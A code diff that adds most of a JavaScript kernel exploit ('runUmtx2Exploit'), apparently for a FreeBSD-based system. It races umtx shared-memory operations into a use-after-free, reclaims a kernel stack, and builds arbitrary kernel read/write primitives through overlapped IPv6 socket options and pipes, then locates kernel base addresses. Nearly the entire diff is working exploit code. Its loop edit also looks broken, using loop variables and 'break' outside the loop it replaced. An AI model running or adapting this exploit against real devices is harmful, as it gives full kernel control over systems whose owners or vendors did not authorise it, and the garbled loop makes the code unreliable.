@@ -805,13 +805,694 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         const beforeRaceTime = performance.now();
         showTemporaryAlert("Triggering race...", LogLevel.LOG);
 
-        for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
-            if (i2 % 5 == 0) {
-                if (debug) {
-                    await log(`Race attempt ${i}-${i2} (mem access fail count: ${checkMemoryAccessFailCount})`, LogLevel.INFO | LogLevel.FLAG_TEMP);
-                } else {
-                    await log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
-                }
+      await Promise.all(
+        Array.from({ length: config.max_race_attempts }, (_, i2) =>
+            i2 % 2 == 0 
+                ? log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP)
+                : Promise.resolve()
+                )
+            );
+
+            // const step1Start = performance.now();
+            // umtx_shm_create
+            chain.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, primaryShmKeyBuf);
+            chain.write_result(mainFdBuf);
+
+            chain.if(mainFdBuf, chain.branch_types.GREATER, 0, false, () => {
+                chain.multiply_by_0x4000(mainFdBuf, mainFdSizeBuf);
+                chain.self_healing_syscall_2(SYS_FTRUNCATE, mainFdBuf, true, mainFdSizeBuf, true);
+                chain.self_healing_syscall_2(SYS_CLOSE, mainFdBuf, true);
+            });
+
+            await chain.run();
+            // const step1End = performance.now();
+
+            // const step2Start = performance.now();
+            await waitForRaceThreadsState(threadStatus.READY);
+            // const step2End = performance.now();
+
+            // const step3Start = performance.now();
+            p.write8(commonThreadData.resume, 0);
+            p.write8(commonThreadData.start, 1);
+            // const step3End = performance.now();
+
+            // const step4Start = performance.now();
+            await waitForRaceThreadsState(threadStatus.DONE);
+            // const step4End = performance.now();
+
+            // const step5Start = performance.now();
+            let destroyCount = p.read4(destroyerThread0Data.destroyCount) + p.read4(destroyerThread1Data.destroyCount);
+
+            let lookupFd = p.read4(lookupThreadData.fd) << 0;
+            // const step5End = performance.now();
+
+            // const step6Start = performance.now();
+            const fd = await getShmFdFromSize(lookupFd);
+            // const step6End = performance.now();
+            if (fd) {
+                winnerFd = fd;
+                winnerLookupFd = lookupFd;
+                await log(`overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
             }
 
+            // dont close lookup descriptor right away when it is possibly corrupted
+            if (destroyCount == 2 && lookupFd != 3 && lookupFd != -1) {
+                fdsToFix.push(lookupFd);
+            }
+
+            // const step7Start = performance.now();
+            // close other fds
+            for (let i3 = 0; i3 < (config.num_spray_fds * 2); i3++) {
+                const addr = sprayFdsBuf.add32(0x8 * i3);
+                const fd = p.read4(addr) << 0;
+                if (fd > 0 && fd != winnerFd) {
+                    chain.add_syscall(SYS_CLOSE, fd);
+                }
+                chain.push_write8(addr, 0);
+            }
+            await chain.run();
+            // const step7End = performance.now();
+
+            // we have won the race
+            if (winnerFd) {
+                break;
+            }
+
+            // const step8Start = performance.now();
+            await resetCommonData();
+            resetLookupThreadState();
+            resetDestroyerThread0State();
+            resetDestroyerThread1State();
+            // const step8End = performance.now();
+
+            if (i2 !== config.max_race_attempts - 1) {
+                p.write8(commonThreadData.resume, 1);
+            }
+
+            // alert(`Race step times:\n` +
+            //     `1: ${toHumanReadableTime(step1End - step1Start)}  | ` +
+            //     `2: ${toHumanReadableTime(step2End - step2Start)}  | ` +
+            //     `3: ${toHumanReadableTime(step3End - step3Start)}  | ` +
+            //     `4: ${toHumanReadableTime(step4End - step4Start)}  | ` +
+            //     `5: ${toHumanReadableTime(step5End - step5Start)}  | ` +
+            //     `6: ${toHumanReadableTime(step6End - step6Start)}  | ` +
+            //     `7: ${toHumanReadableTime(step7End - step7Start)}  | ` +
+            //     `8: ${toHumanReadableTime(step8End - step8Start)}`);
+
+            count++;
+        }
+
+        if (count != config.max_race_attempts) {
+            await log(`Race won after ${count} attempts`, LogLevel.INFO);
+        } else {
+            await log("Race max attempts reached, retrying...", LogLevel.INFO);
+        }
+
+        const afterRaceTime = performance.now();
+        if (debug) await log(`Race took ${toHumanReadableTime(afterRaceTime - beforeRaceTime)}`, LogLevel.INFO);
+
+        // signal all threads to exit
+        p.write8(commonThreadData.exit, 1);
+        p.write8(commonThreadData.resume, 1);
+
+        if (debug) await log("Waiting for all threads to exit...", LogLevel.DEBUG);
+
+        await waitForRaceThreadsState(threadStatus.EXITED);
+
+        if (debug) await log("All threads exited", LogLevel.DEBUG);
+
+        if (!winnerFd) {
+            if (debug) await log("Loser", LogLevel.ERROR);
+            continue;
+        }
+
+        // we have 2 fd referencing a shmfd which will be freed if we close 1 fd
+        let closeRes = await chain.syscall_int32(SYS_CLOSE, winnerFd);
+        if (closeRes != 0) {
+            if (debug) await log("Failed to close winnerFd", LogLevel.ERROR);
+            continue;
+        }
+
+        // map memory of freed shm object
+        const PROT_NONE = 0x0;
+        const MAP_SHARED = 0x1;
+
+        // @ts-ignore
+        kstack = await chain.syscall(SYS_MMAP, 0, 0x4000, PROT_NONE, MAP_SHARED, winnerLookupFd, 0);
+        if ((kstack.low << 0) == -1) {
+            await log("Failed to mmap kstack", LogLevel.WARN);
+            continue;
+        }
+
+        await resetKprimThreads();
+
+        for (let i = 0; i < config.num_kprim_threads; i++) {
+            const thread = kprimThreads[i];
+            thread.spawn_thread_chain();
+        }
+
+        if (debug) await log("Going to spawn kprim threads...", LogLevel.DEBUG);
+        await chain.run();
+        if (debug) await log("kprim threads spawned", LogLevel.DEBUG);
+
+        // wait for kprim threads to be ready
+        await waitForKprimThreadsState(threadStatus.READY);
+
+        if (debug) await log(`All kprim threads ready ${config.num_kprim_threads}`, LogLevel.DEBUG);
+
+        if (closeRes != 0 || (kstack.low << 0) == -1) {
+            await log("Failed to reclaim kstack. Retrying...", LogLevel.WARN);
+            if (doInvalidKstackMunmap) {
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
+            }
+            kstack = null;
+            continue;
+        }
+
+        kstacksToFix.push(kstack);
+
+        showTemporaryAlert(`Managed to reclaim kstack with mmap. kstack = ${kstack.toString(16)}`, LogLevel.INFO);
+
+        // change memory protections to r/w
+        const PROT_READ = 0x1;
+        const PROT_WRITE = 0x2;
+        const mprotectRes = await chain.syscall_int32(SYS_MPROTECT, kstack, 0x4000, PROT_READ | PROT_WRITE);
+        if (mprotectRes != 0) {
+            await log("mprotect failed. Retrying...", LogLevel.WARN);
+            if (doInvalidKstackMunmap) {
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
+            }
+            kstack = null;
+            continue;
+        }
+
+        await log("Managed to modify kstack memory protection to r/w", LogLevel.INFO);
+
+        // check if we have access to the page
+        const checkRes = await checkMemoryAccess(kstack);
+        if (!checkRes) {
+            checkMemoryAccessFailCount++;
+            await log("Failed to access kstack memory. Retrying...", LogLevel.WARN);
+            if (doInvalidKstackMunmap) {
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
+            }
+            kstack = null;
+            await new Promise((resolve) => setTimeout(resolve, 1000));
+            continue;
+        }
+
+        await log("kstack can be accessed", LogLevel.SUCCESS);
+
+        const kprimId = verifyKstack(kstack);
+        if (kprimId == null) {
+            await log("Failed to get kprim id from kstack. Retrying..", LogLevel.WARN);
+            if (doInvalidKstackMunmap) {
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
+            }
+            kstack = null;
+            continue;
+        }
+
+        // ask all kprim threads to exit, except for thread that reclaims kstack
+        p.write8(kprimCommonData.thr_index, kprimId);
+        p.write8(kprimCommonData.exit, 1);
+
+        await log(`Successfully reclaimed kstack (kprim_id = ${kprimId})`, LogLevel.SUCCESS);
+        if (debug) await log("Waiting for all kprim threads to exit (except the winner thread)...", LogLevel.DEBUG);
+
+        await waitForKprimThreadsState(threadStatus.EXITED, config.num_kprim_threads - 1);
+
+        if (debug) await log("All kprim threads exited", LogLevel.DEBUG);
+
+        break;
+    }
+
+    if (!winnerFd || !winnerLookupFd) {
+        throw new Error("Loser");
+    }
+
+    function getKprimCurthrFromKstack(kstack) {
+        const cnt = 0x1000 / 8;
+
+        let kernelPtrs = {};
+
+        for (let i = 0; i < cnt; i++) {
+            const qword = p.read8(kstack.add32(0x3000 + (i * 8)));
+            if (qword.low == 0) {
+                continue;
+            }
+
+            // if the qword.hi starts with 0xffff8 then it is a kernel pointer
+            if (((qword.hi & 0xffff8000) >>> 0) === 0xffff8000) {
+                const key = qword.toString(16);
+                if (!kernelPtrs[key]) {
+                    kernelPtrs[key] = {};
+                    kernelPtrs[key].val = qword;
+                    kernelPtrs[key].count = 0;
+                }
+                kernelPtrs[key].count++;
+            }
+        }
+
+        // find the kernel pointer with most occurrences
+        let maxCount = 0;
+        let maxKey = null;
+        for (let key in kernelPtrs) {
+            const val = kernelPtrs[key];
+            if (val.count > maxCount) {
+                maxCount = val.count;
+                maxKey = key;
+            }
+        }
+
+        if (maxCount < 2) {
+            throw new Error("Failed to find curthr");
+        }
+
+        if (!maxKey) {
+            return null;
+        }
+
+        return kernelPtrs[maxKey].val;
+    }
+
+    const OFFSET_IOV_BASE = 0x00;
+    const OFFSET_IOV_LEN = 0x08;
+    const SIZE_IOV = 0x10;
+    const OFFSET_UIO_RESID = 0x18;
+    const OFFSET_UIO_SEGFLG = 0x20;
+    const OFFSET_UIO_RW = 0x24;
+
+    function updateIovInKstack(origIovBase, newIovBase, uioSegflg, isWrite, len) {
+        let stackIovOffset = -1;
+
+        const scanStart = 0x2000;
+        const scanMax = 0x4000 - 0x50;
+
+        for (let i = scanStart; i < scanMax; i += 8) {
+            const possibleIovBase = p.read8(kstack.add32(i + OFFSET_IOV_BASE));
+            const possibleIovLen = p.read4(kstack.add32(i + OFFSET_IOV_LEN)) << 0;
+
+            // if (possibleIovBase == origIovBase && possibleIovLen == len) {
+            if ((possibleIovBase.low == origIovBase.low && possibleIovBase.hi == origIovBase.hi) && possibleIovLen == len) {
+                const possibleUioResid = p.read8(kstack.add32(i + SIZE_IOV + OFFSET_UIO_RESID)).low << 0;
+                const possibleUioSegflg = p.read4(kstack.add32(i + SIZE_IOV + OFFSET_UIO_SEGFLG)) << 0;
+                const possibleUioRw = p.read4(kstack.add32(i + SIZE_IOV + OFFSET_UIO_RW)) << 0;
+
+                if (possibleUioResid == len && possibleUioSegflg == 0 && possibleUioRw == isWrite) {
+                    // if (debug) await log(`Found iov on kstack. pos = ${i.toString(16)} is_write = ${isWrite} len = ${len}`);
+                    stackIovOffset = i;
+                    break;
+                }
+            }
+        }
+
+        if (stackIovOffset == -1) {
+            throw new Error("Failed to find iov");
+        }
+
+
+        p.write8(kstack.add32(stackIovOffset + OFFSET_IOV_BASE), newIovBase);
+        p.write4(kstack.add32(stackIovOffset + SIZE_IOV + OFFSET_UIO_SEGFLG), uioSegflg);
+    }
+
+
+
+    const PHYS_PAGE_SIZE = 0x1000;
+
+    const kstackKrwReadBuf = alloc(0x8);
+    async function kstackKrwReadQword(kaddr) {
+        // fill up pipe
+        for (let i = 0; i < PIPE_SIZE; i += PHYS_PAGE_SIZE) {
+            chain.add_syscall(SYS_WRITE, pipeSlowWriteFd, pipe_buf, PHYS_PAGE_SIZE);
+        }
+        await chain.run();
+
+        p.write8(kprimCommonData.cmd, kstackKernelRwCmd.READ_QWORD);
+        await new Promise((resolve) => setTimeout(resolve, 10)); // wait a while until kernel stack is populated
+
+        await updateIovInKstack(pipe_buf, kaddr, 1, 1, 8);
+
+        await chain.syscall(SYS_READ, pipeSlowReadFd, pipe_buf, PIPE_SIZE); // read garbage
+        await chain.syscall(SYS_READ, pipeSlowReadFd, kstackKrwReadBuf, 8); // read kernel data
+
+        while (p.read4(kprimCommonData.cmd) != kstackKernelRwCmd.NOP) {
+            await new Promise((resolve) => setTimeout(resolve, 10));
+        }
+
+        return p.read8(kstackKrwReadBuf);
+    }
+
+
+    const kstackKrwWriteBuf = alloc(0x8);
+    /**
+     * 
+     * @param {int64} kaddr 
+     * @param {int64|number} val 
+     */
+    async function kstackKrwWriteQword(kaddr, val) {
+        p.write8(kstackKrwWriteBuf, val);
+
+        // will hang until we write
+        p.write8(kprimCommonData.cmd, kstackKernelRwCmd.WRITE_QWORD);
+        await new Promise((resolve) => setTimeout(resolve, 10)); // wait a while until kernel stack is populated
+
+        await updateIovInKstack(pipe_buf, kaddr, 1, 0, 8);
+
+        await chain.syscall(SYS_WRITE, pipeSlowWriteFd, kstackKrwWriteBuf, 8);
+
+        while (p.read4(kprimCommonData.cmd) != kstackKernelRwCmd.NOP) {
+            await new Promise((resolve) => setTimeout(resolve, 10));
+        }
+    }
+
+    const OFFSET_THREAD_TD_PROC = 0x8;
+    const OFFSET_P_FD = 0x48;
+    const OFFSET_P_UCRED = 0x40;
+    const OFFSET_FDESCENTTBL_FDT_OFILES = 0x8;
+
+    const kprimCurthr = getKprimCurthrFromKstack(kstack);
+    const curproc = await kstackKrwReadQword(kprimCurthr.add32(OFFSET_THREAD_TD_PROC));
+    const curprocUcred = await kstackKrwReadQword(curproc.add32(OFFSET_P_UCRED));
+    const curprocFd = await kstackKrwReadQword(curproc.add32(OFFSET_P_FD));
+    const fdescenttbl = await kstackKrwReadQword(curprocFd);
+    const curprocNfilesAddr = fdescenttbl;
+    const curprocOfiles = fdescenttbl.add32(OFFSET_FDESCENTTBL_FDT_OFILES); // account for fdt_nfiles
+
+
+    const AF_INET = 2;
+    const AF_INET6 = 28;
+    const SOCK_STREAM = 1;
+    const SOCK_DGRAM = 2;
+    const IPPROTO_UDP = 17;
+    const IPPROTO_IPV6 = 41;
+    const IPV6_PKTINFO = 46;
+
+    const masterSock = await chain.syscall_int32(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+    const victimSock = await chain.syscall_int32(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+
+    // using p.malloc here bc these need to be preserved outside this function, the alloc allocations get freed
+    const PKTINFO_SIZE = 0x14;
+    const masterBuffer = p.malloc(PKTINFO_SIZE, 1);
+    const slaveBuffer = p.malloc(PKTINFO_SIZE, 1);
+    const pipemapBuffer = p.malloc(PKTINFO_SIZE, 1);
+    const pktinfoSizeStore = p.malloc(0x8, 1);
+    p.write8(pktinfoSizeStore, PKTINFO_SIZE);
+
+    await chain.syscall(SYS_SETSOCKOPT, masterSock, IPPROTO_IPV6, IPV6_PKTINFO, masterBuffer, PKTINFO_SIZE);
+    await chain.syscall(SYS_SETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, slaveBuffer, PKTINFO_SIZE);
+
+    const masterSockFileDescAddr = curprocOfiles.add32(masterSock * 0x30);
+    const victimSockFileDescAddr = curprocOfiles.add32(victimSock * 0x30);
+
+    const masterSockFileAddr = await kstackKrwReadQword(masterSockFileDescAddr);
+    const victimSockFileAddr = await kstackKrwReadQword(victimSockFileDescAddr);
+
+    const masterSockSocketAddr = await kstackKrwReadQword(masterSockFileAddr);
+    const victimSockSocketAddr = await kstackKrwReadQword(victimSockFileAddr);
+
+    const masterPcb = await kstackKrwReadQword(masterSockSocketAddr.add32(0x18));
+    const slavePcb = await kstackKrwReadQword(victimSockSocketAddr.add32(0x18));
+
+    const masterPktopts = await kstackKrwReadQword(masterPcb.add32(0x120));
+    const slavePktopts = await kstackKrwReadQword(slavePcb.add32(0x120));
+
+    await kstackKrwWriteQword(masterPktopts.add32(0x10), slavePktopts.add32(0x10));
+
+    await log(`Overlapped ipv6 sockets`, LogLevel.SUCCESS);
+
+    function chainPushWriteToVictim(addr) {
+        chain.push_write8(masterBuffer, addr);
+        chain.push_write8(masterBuffer.add32(0x08), 0);
+        chain.push_write4(masterBuffer.add32(0x10), 0);
+        chain.self_healing_syscall(SYS_SETSOCKOPT, masterSock, IPPROTO_IPV6, IPV6_PKTINFO, masterBuffer, 0x14);
+    }
+
+    function chainPushIPv6Kread(addr, buffer) {
+        chainPushWriteToVictim(addr);
+        chain.self_healing_syscall(SYS_GETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, pktinfoSizeStore);
+    }
+    
+    function chainPushIPv6Kwrite(addr, buffer) {
+        chainPushWriteToVictim(addr);
+        chain.self_healing_syscall(SYS_SETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, 0x14);
+    }
+
+    async function ipv6_kwrite(addr, buffer) {
+        chainPushIPv6Kwrite(addr, buffer);
+        await chain.run();
+    }
+    
+    async function ipv6_kread8(addr) {
+        chainPushIPv6Kread(addr, slaveBuffer);
+        await chain.run();
+        return p.read8(slaveBuffer);
+    }
+
+    // Create pipe pair and ultimate r/w prims
+    const pipeMem = p.malloc(0x8, 1);
+    await chain.syscall(SYS_PIPE2, pipeMem, 0);
+
+    const pipeRead = p.read4(pipeMem);
+    const pipeWrite = p.read4(pipeMem.add32(0x4));
+    const pipeFiledescent = curprocOfiles.add32(pipeRead * 0x30);
+    const pipeFile = await ipv6_kread8(pipeFiledescent);
+    const pipeAddr = await ipv6_kread8(pipeFile);
+
+    /**
+     * 
+     * @param {int64} src
+     * @param {boolean} dereferenceSrc
+     * @param {int64} dest 
+     * @param {boolean} dereferenceDest
+     * @param {number} length 
+     */
+    function chainPushCopyout(src, dereferenceSrc, dest, dereferenceDest, length) {
+        chain.push_write8(pipemapBuffer, chainPushCopyout.value0);
+        chain.push_write8(pipemapBuffer.add32(0x8), chainPushCopyout.value1);
+        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
+        chainPushIPv6Kwrite(pipeAddr, pipemapBuffer);
+
+        if (dereferenceSrc) {
+            chain.push_copy8(pipemapBuffer, src);
+        } else {
+            chain.push_write8(pipemapBuffer, src);
+        }
+
+        chain.push_write8(pipemapBuffer.add32(0x8), 0x0);
+        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
+        chainPushIPv6Kwrite(pipeAddr.add32(0x10), pipemapBuffer);
+
+        chain.self_healing_syscall_2(SYS_READ, pipeRead, false, dest, dereferenceDest, length);
+    }
+    chainPushCopyout.value0 = new int64(0x40000000, 0x40000000);
+    chainPushCopyout.value1 = new int64(0x00000000, 0x40000000);
+
+    /** 
+     * 
+     * @param {int64} src
+     * @param {boolean} extraDereferenceSrc
+     * @param {int64} dest
+     * @param {boolean} dereferenceDest
+     * @param {number} length
+     */
+    function chainPushCopyin(src, extraDereferenceSrc, dest, dereferenceDest, length) {
+        chain.push_write8(pipemapBuffer, 0x0);
+        chain.push_write8(pipemapBuffer.add32(0x8), chainPushCopyin.value);
+        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
+        chainPushIPv6Kwrite(pipeAddr, pipemapBuffer);
+
+        if (dereferenceDest) {
+            chain.push_copy8(pipemapBuffer, dest);
+        } else {
+            chain.push_write8(pipemapBuffer, dest);
+        }
+        chain.push_write8(pipemapBuffer.add32(0x8), 0x0);
+        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
+        chainPushIPv6Kwrite(pipeAddr.add32(0x10), pipemapBuffer);
+
+        chain.self_healing_syscall_2(SYS_WRITE, pipeWrite, false, src, extraDereferenceSrc, length);
+    }
+    chainPushCopyin.value = new int64(0x00000000, 0x40000000);
+
+
+
+
+
+
+    const krw_qword_store = p.malloc(0x8, 1);
+    async function kernel_write8(kaddr, val) {
+        p.write8(krw_qword_store, val);
+        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x8);
+        await chain.run();
+    }
+
+    async function kernel_write4(kaddr, val) {
+        p.write4(krw_qword_store, val);
+        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x4);
+        await chain.run();
+    }
+
+    async function kernel_write2(kaddr, val) {
+        p.write2(krw_qword_store, val);
+        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x2);
+        await chain.run();
+    }
+
+    async function kernel_write1(kaddr, val) {
+        p.write1(krw_qword_store, val);
+        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x1);
+        await chain.run();
+    }
+
+    async function kernel_read8(kaddr) {
+        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x8);
+        await chain.run();
+        return p.read8(krw_qword_store);
+    }
+
+    async function kernel_read4(kaddr) {
+        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x4);
+        await chain.run();
+        return p.read4(krw_qword_store);
+    }
+
+    async function kernel_read2(kaddr) {
+        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x2);
+        await chain.run();
+        return p.read2(krw_qword_store);
+    }
+
+    async function kernel_read1(kaddr) {
+        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x1);
+        await chain.run();
+        return p.read1(krw_qword_store);
+    }
+
+    function chainPushIncSocketRefcount(target_fd) {
+        const fileDataAddrStore = alloc(0x8);
+        const valueStore = alloc(0x8);
+
+        const filedescentAddr = curprocOfiles.add32(target_fd * 0x30);
+        chainPushCopyout(filedescentAddr, false, fileDataAddrStore, false, 0x8); // fde_file
+        chainPushCopyout(fileDataAddrStore, true, fileDataAddrStore, false, 0x8); // f_data
+
+        chain.push_write4(valueStore, 0x100);
+        chainPushCopyin(valueStore, false, fileDataAddrStore, true, 0x4); // so_count = 0x100
+    }
+
+
+    function chainPushFixupBadFds() {
+        const fileAddrStore = alloc(0x8);
+        const fileDataAddrStore = alloc(0x8);
+
+        const valueStore = alloc(0x8);
+
+        for (let fd of fdsToFix) {
+            const filedescentAddr = curprocOfiles.add32(fd * 0x30);
+            chainPushCopyout(filedescentAddr, false, fileAddrStore, false, 0x8); // fde_file
+            chainPushCopyout(fileAddrStore, true, fileDataAddrStore, false, 0x8); // f_data
+
+            chain.push_write8(valueStore, 0x10);
+
+            chain.push_inc8(fileDataAddrStore, 0x10); // shm_refs
+            chainPushCopyin(valueStore, false, fileDataAddrStore, true, 0x8); // shm_refs = 0x10
+
+            chain.push_inc8(fileAddrStore, 0x28); // f_count
+            chainPushCopyin(valueStore, false, fileAddrStore, true, 0x8); // f_count = 0x10
+        }
+    }
+
+    function chainPushFixupThreadKstack() {
+        const thrKstackObjStore = alloc(0x8);
+        const valueStore = alloc(0x8);
+
+        chainPushCopyout(kprimCurthr.add32(0x468), false, thrKstackObjStore, false, 0x8); // td_kstack_obj
+
+        chain.push_write8(valueStore, 0x0);
+        chainPushCopyin(valueStore, false, kprimCurthr.add32(0x470), false, 0x8); // td_kstack
+
+        chain.push_write4(valueStore, 0x10);
+        chain.push_inc8(thrKstackObjStore, 0x84); // ref_count
+        chainPushCopyin(valueStore, false, thrKstackObjStore, true, 0x4); // ref_count = 0x10
+    }
+
+
+    if (!fdsToFix.includes(winnerLookupFd)) {
+        fdsToFix.push(winnerLookupFd);
+    }
+    
+    await log("Creating fixup chain...", LogLevel.INFO);
+    chainPushIncSocketRefcount(masterSock);
+    chainPushIncSocketRefcount(victimSock);
+    chainPushFixupBadFds();
+    chainPushFixupThreadKstack();
+
+    await log("Running fixup...", LogLevel.INFO);
+    await chain.run();
+
+    await chain.syscall(SYS_CLOSE, winnerLookupFd);
+
+    await log("Fixes applied", LogLevel.SUCCESS);
+
+    await log("Looking for allproc...", LogLevel.INFO);
+    async function findAllproc() {
+        let proc = curproc;
+        const maxAttempt = 50;
+
+        for (let i = 0; i < maxAttempt; i++) {
+            if (((proc.hi & 0xffff8040) >>> 0) == 0xffff8040) {
+                const dataBase = proc.sub32(OFFSET_KERNEL_ALLPROC - OFFSET_KERNEL_DATA);
+                if (((dataBase.low >>> 0) & 0xfff) == 0) {
+                    return proc;
+                }
+            }
+            proc = await kernel_read8(proc.add32(0x8)); // proc->p_list->le_prev
+        }
+
+        throw new Error("Failed to find allproc");
+    }
+
+    const allProc = await findAllproc();
+    await log("Found allproc", LogLevel.INFO);
+
+    const dataBase = allProc.sub32(OFFSET_KERNEL_ALLPROC - OFFSET_KERNEL_DATA);
+    const textBase = dataBase.sub32(OFFSET_KERNEL_DATA);
+
+    const totalEndTime = performance.now();
+    const totalDuration = totalEndTime - totalStartTime;
+
+    p.write8(kprimCommonData.cmd, kstackKernelRwCmd.EXIT);
+
+    await waitForKprimThreadsState(threadStatus.EXITED, config.num_kprim_threads);
+
+    await pinToCore(ogCore);
+    await setRtprio(ogPrio, PRI_TIMESHARE);
+
+    await chain.syscall(SYS_MUNMAP, bumpAllocatorBuffer, BUMP_ALLOCATOR_SIZE);
+
+    showTemporaryAlert(`Done!:   ${toHumanReadableTime(totalDuration)}`, LogLevel.SUCCESS);
+    if (debug) await log(`checkMemoryAccessFailCount: ${checkMemoryAccessFailCount}`, LogLevel.INFO);
+
+    return {
+        masterSock: masterSock,
+        victimSock: victimSock,
+        kdataBase: dataBase,
+        ktextBase: textBase,
+        read1: kernel_read1,
+        read2: kernel_read2,
+        read4: kernel_read4,
+        read8: kernel_read8,
+        write1: kernel_write1,
+        write2: kernel_write2,
+        write4: kernel_write4,
+        write8: kernel_write8,
+        curthrAddr: kprimCurthr,
+        curprocAddr: curproc,
+        procUcredAddr: curprocUcred,
+        procFdAddr: curprocFd,
+        pipeAddr: pipeAddr,
+        pipeMem: pipeMem
+    };
+}
             
